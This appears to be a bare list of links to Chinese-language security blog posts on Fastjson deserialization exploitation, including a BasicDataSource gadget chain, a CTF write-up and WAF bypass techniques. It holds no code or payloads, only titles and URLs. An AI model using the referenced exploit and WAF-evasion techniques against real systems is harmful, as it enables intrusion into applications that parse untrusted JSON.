http://wjlshare.com/archives/1512

https://xz.aliyun.com/t/8979#toc-3

[FastJson反序列化之BasicDataSource利用链 – cc (ccship.cn)](https://ccship.cn/2021/12/21/fastjson反序列化之basicdatasource利用链/#toc-head-1)

[(77条消息) 2021安洵杯ezjson-wp_fmyyy1的博客-CSDN博客](https://blog.csdn.net/fmyyy1/article/details/121674546)

https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/